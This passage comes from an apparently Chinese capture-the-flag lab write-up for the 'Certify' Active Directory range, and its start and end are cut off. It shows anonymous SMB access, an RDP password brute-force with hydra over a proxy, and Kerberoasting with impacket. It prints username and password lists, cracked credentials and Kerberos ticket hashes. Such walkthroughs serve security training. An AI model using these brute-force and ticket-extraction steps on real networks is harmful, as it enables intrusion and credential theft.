class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span> XIAORANG<span class="literal">-DC</span>.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>  <span class="number">172.22</span>.<span class="number">9.19</span>  http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/ <span class="number">172.22</span>.<span class="number">9.19</span> 跳板机 solr 已拿下</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span> DESKTOP<span class="literal">-CBKTVMO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span>     XIAORANG\CA01</span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span> fileserver  smb vulnerable 详情:password=<span class="number">123456</span>, <span class="built_in">type</span>=weak<span class="literal">-password</span>, port=<span class="number">445</span>, service=smb, username=administrator</span><br></pre></td></tr></table></figure><p>那么我们直接用<font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">s</font>mbclient连</p><p>显示需要输密码，但是好像不是弱口令，直接就是空口令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> smbclient \\\\<span class="number">172.22</span>.<span class="number">9.47</span>\\fileshare</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line">get flag02.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q smbclient \\\\172.22.9.47\\fileshare</span></span><br><span class="line">Enter WORKGROUP\root<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; dir</span></span><br><span class="line"><span class="string">  .                                   D        0  Wed Jul 13 04:12:10 2022</span></span><br><span class="line"><span class="string">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span></span><br><span class="line"><span class="string">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span></span><br><span class="line"><span class="string">  secret                              D        0  Sun Jun  1 11:54:56 2025</span></span><br><span class="line"><span class="string">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span></span><br><span class="line"><span class="string">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">41152812 blocks of size 1024. 36033120 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \secret\&gt; get flag02.txt</span></span><br><span class="line"><span class="string">getting file \secret\flag02.txt of size 659 as flag02.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/17.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ________  _______   ________  _________  ___  ________ ___    ___ </span><br><span class="line">|\   ____\|\  ___ \ |\   __  \|\___   ___\\  \|\  _____\\  \  /  /|</span><br><span class="line">\ \  \___|\ \   __/|\ \  \|\  \|___ \  \_\ \  \ \  \__/\ \  \/  / /</span><br><span class="line"> \ \  \    \ \  \_|/_\ \   _  _\   \ \  \ \ \  \ \   __\\ \    / / </span><br><span class="line">  \ \  \____\ \  \_|\ \ \  \\  \|   \ \  \ \ \  \ \  \_| \/  /  /  </span><br><span class="line">   \ \_______\ \_______\ \__\\ _\    \ \__\ \ \__\ \__\__/  / /    </span><br><span class="line">    \|_______|\|_______|\|__|\|__|    \|__|  \|__|\|__|\___/ /     </span><br><span class="line">                                                      \|___|/      </span><br><span class="line"></span><br><span class="line">flag02: flag&#123;<span class="number">60</span>d1abd8<span class="literal">-614d-4b54-926a-af0ea936461e</span>&#125;</span><br><span class="line"></span><br><span class="line">Yes, you have enumerated smb. But <span class="keyword">do</span> you know what an SPN is?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给了个提示SPN</p><p>我们再看看smb里有什么</p><p>将数据库文件下载下来直接拖进navicat查看</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/19.png"></p><p><font style="color:rgb(77, 77, 77);">在xr_members表中可以发现email列里面的内容可能是域里面的用户（跟time是一样的）</font></p><p><font style="color:rgb(77, 77, 77);">就又想到了喷洒有效的用户（但是发现其实不用喷洒有效用户）</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">还有些密码</font></p><p><font style="color:rgb(77, 77, 77);">全部导出进行rdp爆破</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">i9XDE02pLVf</span><br><span class="line"><span class="number">6</span>N70jt2K9<span class="built_in">sV</span></span><br><span class="line">fiAzGwEMgTY</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line">huangmin</span><br><span class="line">zhangrong</span><br><span class="line">liying</span><br><span class="line">zhaoli</span><br><span class="line">zhangyan</span><br><span class="line">zhoujing</span><br><span class="line">liuying</span><br><span class="line">wanghao</span><br><span class="line">wangqiang</span><br><span class="line">wanglu</span><br><span class="line">zhaoyong</span><br><span class="line">zhangli</span><br><span class="line">wangning</span><br><span class="line">wangyu</span><br><span class="line">yangli</span><br><span class="line">zhangqian</span><br><span class="line">lishuai</span><br><span class="line">yangliu</span><br><span class="line">wangying</span><br><span class="line">chenjie</span><br><span class="line">yangyong</span><br><span class="line">lipeng</span><br><span class="line">lixin</span><br><span class="line">liukai</span><br><span class="line">machao</span><br><span class="line">lijia</span><br><span class="line">zhangping</span><br><span class="line">zhanghui</span><br><span class="line">zhangwen</span><br><span class="line">wangmin</span><br><span class="line">chenlin</span><br><span class="line">chenjuan</span><br><span class="line">lining</span><br><span class="line">wangwei</span><br><span class="line">zhangnan</span><br><span class="line">wangxia</span><br><span class="line">zhangyu</span><br><span class="line">chenchen</span><br><span class="line">wangbing</span><br><span class="line">lilin</span><br><span class="line">zhangling</span><br><span class="line">chenling</span><br><span class="line">yangmei</span><br><span class="line">liuqiang</span><br><span class="line">lihong</span><br><span class="line">lilei</span><br><span class="line">wanghuan</span><br><span class="line">wangxin</span><br><span class="line">yangping</span><br><span class="line">lijie</span><br><span class="line">wangqian</span><br><span class="line">liping</span><br><span class="line">liuhui</span><br><span class="line">zhangming</span><br><span class="line">zhangying</span><br><span class="line">libo</span><br><span class="line">liuqin</span><br><span class="line">wangchao</span><br><span class="line">liuli</span><br><span class="line">yangwei</span><br><span class="line">wangyan</span><br><span class="line">wangjian</span><br><span class="line">zhangbin</span><br><span class="line">wangli</span><br><span class="line">wangdan</span><br><span class="line">liuxia</span><br><span class="line">zhangrui</span><br><span class="line">wangdong</span><br><span class="line">wangting</span><br><span class="line">zhangjian</span><br><span class="line">wanghua</span><br><span class="line">liyan</span><br><span class="line">liufeng</span><br><span class="line">zhangbo</span><br><span class="line">liuming</span><br><span class="line">liujia</span><br><span class="line">chentao</span><br><span class="line">zhangting</span><br><span class="line">liushuai</span><br><span class="line">lijing</span><br><span class="line">wangbin</span><br><span class="line">lijian</span><br><span class="line">zhouyong</span><br><span class="line">liudan</span><br><span class="line">yangbin</span><br><span class="line">liupeng</span><br><span class="line">chenjun</span><br><span class="line">wangbo</span><br><span class="line">libin</span><br><span class="line">zhaowei</span><br><span class="line">lijuan</span><br><span class="line">chenchao</span><br><span class="line">wangming</span><br><span class="line">lifang</span><br><span class="line">wangtao</span><br><span class="line">liufang</span><br><span class="line">litao</span><br><span class="line">yangling</span><br><span class="line">yangxue</span><br><span class="line">liubin</span><br><span class="line">yangyang</span><br><span class="line">xuwei</span><br><span class="line">chenyong</span><br><span class="line">yangbo</span><br><span class="line">zhanghua</span><br><span class="line">zhaomin</span><br><span class="line">chenping</span><br><span class="line">zhanglei</span><br><span class="line">zhangliang</span><br><span class="line">zhangtao</span><br><span class="line">zhangxue</span><br><span class="line">liqian</span><br><span class="line">liwei</span><br><span class="line">chenbin</span><br><span class="line">zhangyun</span><br><span class="line">wangxue</span><br><span class="line">zhouwei</span><br><span class="line">likai</span><br><span class="line">gaofeng</span><br><span class="line">wanglei</span><br><span class="line">lijun</span><br><span class="line">liuwei</span><br><span class="line">wanggang</span><br><span class="line">liuping</span><br><span class="line">zhangning</span><br><span class="line">libing</span><br><span class="line">zhangchao</span><br><span class="line">zhangxia</span><br><span class="line">limin</span><br><span class="line">liulei</span><br><span class="line">wangling</span><br><span class="line">zhangfei</span><br><span class="line">chenlong</span><br><span class="line">liufei</span><br><span class="line">chenli</span><br><span class="line">chenyan</span><br><span class="line">chenpeng</span><br><span class="line">wangrui</span><br><span class="line">zhangfeng</span><br><span class="line">yanglin</span><br><span class="line">liutao</span><br><span class="line">liyong</span><br><span class="line">wangna</span><br><span class="line">wangjuan</span><br><span class="line">wanghui</span><br><span class="line">lilong</span><br><span class="line">lili</span><br><span class="line">zhangshuai</span><br><span class="line">zhangfan</span><br><span class="line">liujing</span><br><span class="line">liuqian</span><br><span class="line">yangfang</span><br><span class="line">chenqiang</span><br><span class="line">liqiang</span><br><span class="line">yangjun</span><br><span class="line">chenbo</span><br><span class="line">zhangyong</span><br><span class="line">wangliang</span><br><span class="line">wangxu</span><br><span class="line">chenhua</span><br><span class="line">zhouli</span><br><span class="line">liubing</span><br><span class="line">zhaojing</span><br><span class="line">yangyan</span><br><span class="line">chenfang</span><br><span class="line">zhanghao</span><br><span class="line">wangyun</span><br><span class="line">zhangxin</span><br><span class="line">zhangwei</span><br><span class="line">wangping</span><br><span class="line">wangkai</span><br><span class="line">liuchang</span><br><span class="line">lixue</span><br><span class="line">lina</span><br><span class="line">liwen</span><br><span class="line">liming</span><br><span class="line">liling</span><br><span class="line">chenwei</span><br><span class="line">lihao</span><br><span class="line">wanglin</span><br><span class="line">zhanglin</span><br><span class="line">xumin</span><br><span class="line">liuyan</span><br><span class="line">zhangmin</span><br><span class="line">zhangqiang</span><br><span class="line">yangchao</span><br><span class="line">yanghua</span><br><span class="line">ligang</span><br><span class="line">liuxin</span><br><span class="line">liuhuan</span><br><span class="line">lifeng</span><br><span class="line">liugang</span><br><span class="line">yangtao</span><br><span class="line">liuhao</span><br><span class="line">lichao</span><br><span class="line">yanghong</span><br><span class="line">chenhong</span><br><span class="line">sunwei</span><br><span class="line">zhanghong</span><br><span class="line">zhangdan</span><br><span class="line">liumin</span><br><span class="line">wangmei</span><br><span class="line">zhangjing</span><br><span class="line">liujun</span><br><span class="line">wangyong</span><br><span class="line">huangyong</span><br><span class="line">lixiang</span><br><span class="line">zhoujie</span><br><span class="line">liuchao</span><br><span class="line">liuna</span><br><span class="line">wangjing</span><br><span class="line">liuling</span><br><span class="line">chenjing</span><br><span class="line">wangqin</span><br><span class="line">wanglong</span><br><span class="line">chenlei</span><br><span class="line">yangjie</span><br><span class="line">zhangjun</span><br><span class="line">yangming</span><br><span class="line">zhangmei</span><br><span class="line">wangrong</span><br><span class="line">zhangpeng</span><br><span class="line">liuyun</span><br><span class="line">wangkun</span><br><span class="line">chenmin</span><br><span class="line">liqin</span><br><span class="line">wangfang</span><br><span class="line">liuhua</span><br><span class="line">zhangqin</span><br><span class="line">zhanglong</span><br><span class="line">zhangjie</span><br><span class="line">liliang</span><br><span class="line">liyun</span><br><span class="line">wangcheng</span><br><span class="line">yangjing</span><br><span class="line">chenying</span><br><span class="line">lihua</span><br><span class="line">liumei</span><br><span class="line">yangjuan</span><br><span class="line">lidan</span><br><span class="line">liyang</span><br><span class="line">zhaojun</span><br><span class="line">liuyong</span><br><span class="line">zhoumin</span><br><span class="line">chenyun</span><br><span class="line">chenmei</span><br><span class="line">wangjie</span><br><span class="line">wangfei</span><br><span class="line">chenxin</span><br><span class="line">chenfei</span><br><span class="line">wangyang</span><br><span class="line">chenhao</span><br><span class="line">lifei</span><br><span class="line">zhangfang</span><br><span class="line">zhangkun</span><br><span class="line">liujuan</span><br><span class="line">lirong</span><br><span class="line">wangjun</span><br><span class="line">yanglei</span><br><span class="line">wangfeng</span><br><span class="line">chenxia</span><br><span class="line">wangshuai</span><br><span class="line">wangpeng</span><br><span class="line">zhangkai</span><br><span class="line">liuyu</span><br><span class="line">zhangxu</span><br><span class="line">chenming</span><br><span class="line">mali</span><br><span class="line">lihui</span><br><span class="line">liuyang</span><br><span class="line">liujie</span><br><span class="line">limei</span><br><span class="line">chengang</span><br><span class="line">liubo</span><br><span class="line">huangwei</span><br><span class="line">liuhong</span><br><span class="line">wanghong</span><br><span class="line">lixia</span><br><span class="line">xujing</span><br><span class="line">liting</span><br><span class="line">zhangna</span><br><span class="line">zhangjuan</span><br><span class="line">chenhui</span><br><span class="line">liuting</span><br><span class="line">yangmin</span><br><span class="line">yangfan</span><br><span class="line">chenliang</span><br><span class="line">zhangjianhua</span><br><span class="line">wangjinfeng</span><br><span class="line">liujianjun</span><br><span class="line">zhanghongmei</span><br><span class="line">lixiurong</span><br><span class="line">chenxiuzhen</span><br><span class="line">lijianguo</span><br><span class="line">zhangguizhen</span><br><span class="line">zhangxiurong</span><br><span class="line">litingting</span><br><span class="line">wuxiuying</span><br><span class="line">chenyulan</span><br><span class="line">zhangyuying</span><br><span class="line">liyuzhen</span><br><span class="line">wanglanying</span><br><span class="line">lijianhua</span><br><span class="line">zhangguilan</span><br><span class="line">liyulan</span><br><span class="line">wangjianping</span><br><span class="line">liuguiying</span><br><span class="line">lijianjun</span><br><span class="line">wangzhiqiang</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> hydra <span class="literal">-L</span> <span class="string">&#x27;user.txt&#x27;</span> <span class="literal">-P</span> <span class="string">&#x27;pass.txt&#x27;</span> <span class="number">172.22</span>.<span class="number">9.26</span> rdp <span class="literal">-V</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/20.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/21.png"></p><p>成功了两个账号密码，但是未开启rdp服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangjian:i9XDE02pLVf</span><br><span class="line">liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><p>根据前面的提示SPN</p><p><strong>我们可以打Kerberoasting</strong></p><p>Kerberoasting攻击在实战中主要分为如下4步：</p><p><strong>1）查询域内注册于域用户下的SPN；</strong></p><p><strong>2）请求指定SPN的ST；</strong></p><p><strong>3）导出请求的ST；</strong></p><p><strong>4）对该导出的ST进行离线爆破。</strong></p><hr><p>那么我们先</p><p>查询域内注册于域用户下的SPN</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py <span class="literal">-request</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py <span class="literal">-request</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt;python GetUserSPNs.py <span class="literal">-request</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">9.7</span> xiaorang.lab/zhangjian:i9XDE02pLVf</span><br><span class="line">Impacket v0.<span class="number">9.23</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation</span><br><span class="line"><span class="literal">-------------------------------------</span>  <span class="literal">--------</span>  <span class="literal">--------</span>  <span class="literal">--------------------------</span>  <span class="literal">---------</span>  <span class="literal">----------</span></span><br><span class="line">TERMSERV/desktop<span class="literal">-cbktvmo</span>.xiaorang.lab  zhangxia            <span class="number">2023</span><span class="literal">-07-14</span> <span class="number">12</span>:<span class="number">45</span>:<span class="number">45.213944</span>  &lt;never&gt;</span><br><span class="line"></span><br><span class="line">WWW/desktop<span class="literal">-cbktvmo</span>.xiaorang.lab/IIS   zhangxia            <span class="number">2023</span><span class="literal">-07-14</span> <span class="number">12</span>:<span class="number">45</span>:<span class="number">45.213944</span>  &lt;never&gt;</span><br><span class="line"></span><br><span class="line">TERMSERV/win2016.xiaorang.lab          chenchen            <span class="number">2023</span><span class="literal">-07-14</span> <span class="number">12</span>:<span class="number">45</span>:<span class="number">39.767035</span>  &lt;never&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line"><span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*zhangxia<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/zhangxia*<span class="variable">$bc05ad7b3883ce626adb11f043475f8e</span><span class="variable">$e2272d593ccc87927c73e67d1d458d64275645192dbfb53e1898f39d91886fefb0ff22379732a657003a7ee06eb916ebf1d978d8a2a4824e8b120ce993b2f81a4df772ebeae9a98dd764fd445596fa6336e8177708262311095e9f346e94f2ddf4653198d53f489d1287e2ef73dfa2666e2fb4d8a5715728da341985eedf425b24213a1f776c300a67254a5857f7d3b696afd7b127174f1f33107b555fcd94ceab26ed5a872c972af0d691e57a5fa8b93a63ec70e0205ced76b090642f3cf1e137406cca103e57bab87aed8375bc541382768d96c824c38c34d7d9b19e1776718a249f337ab837b90509c1c662d14d5c301e6c826ac3effa73e0452b6541a7b0a343c19399c52f5d323defff7cedaeea23647b4b6733a2bba5df123511824336b7d67dd9945ed4186ec65692766c677eda1e23a64aa49bf8d325fc84381a190bce138b82502a1dbae70da4ea2c56aac5bc1fa1e80bf870df076027c386b1b51762d0aee0ecaafc73bb22633c05fd1aed68ec6e31ea105ccd162a27a0e1dbee9c9872c14223af8d51991a71b2b1b48871655659866f66f9859b204571992a90482711262342b42a59c13f974899c244c4f150cd8c98ee39ef5d3ec1d18155e8e12fb249460c60555415407bca5a6857e41f31edf776170d57f692cff3cd8fbd02c9613191d7ca61b62c5d88522b3f6f96fcb493f1e29cefcceb5f523e80e13c204f5e62a1f9d5b1ed2aafd67b19f8114a862c87d4fb55a816906306520a83edc3eef9c88716d0cc60ccba0c6f96bf7a7556f7f501d131ad08c11de78ed9fe2ca25c6971dd35ad4ab456692f2b1541d84b112615a22b380dbe7cdee403c33e2c3f46ac1b3c2a9fc4d8e941543ad928d51ae461805da03821ac60ac368a059ca6487964a79999fb6c1c84dc805a3d527a107694f8f3fab382fda419ee2fac2ac476bc95fc023c5776574264da7f309a321e5e669ed818a95e444087301a83fafd58cab1f8e488e839bf22e40a57480ee564e2369e592dccfb2b27cf7e2579395e2aadceb5bfb6f077bdf7abea7e4a82f02484fdfa68088161cb8bfba237ebb5e3030cd9cb8c80abee2ee450e4d438c710fc5f3af8f0926b215fe6d7c91251db44804b4d3c53488fe6621645479aee83cb29989e8009a0c516db11dc8dc818774604ff6c2274d7c0fb4747b57f463ac805d4674f91d8abb501fd66892952783b019da9e5dc177a63d8e38a6ce0d000f84fa8caff97a38b49625d216452152712a338d94bb706cb59265b7317b943816b5f37f4dfb2c4de2456f2ae16fd92d9cde9ae93b928c96a3c6e749881402957dc59a5d5370720c560aa0bdfbff4e66520ea32f08fd8147e7d869042933d8bf1ba254672ec9dc94e730fe5cdf78ab92b5d49352a3455ad9b5f179afd4c0e8231315c75bae6968c02c3daeb1db04ed6a211197e6b69e25daa3b153dc816c5732c1c2d0f2eff1259e704d6431cb010126b1d97da6ecd0d85ad550bda989de2b88a30</span></span><br><span class="line"><span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*chenchen<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/chenchen*<span class="variable">$2b7c680abb7c3d12c8529687a117d1bf</span><span 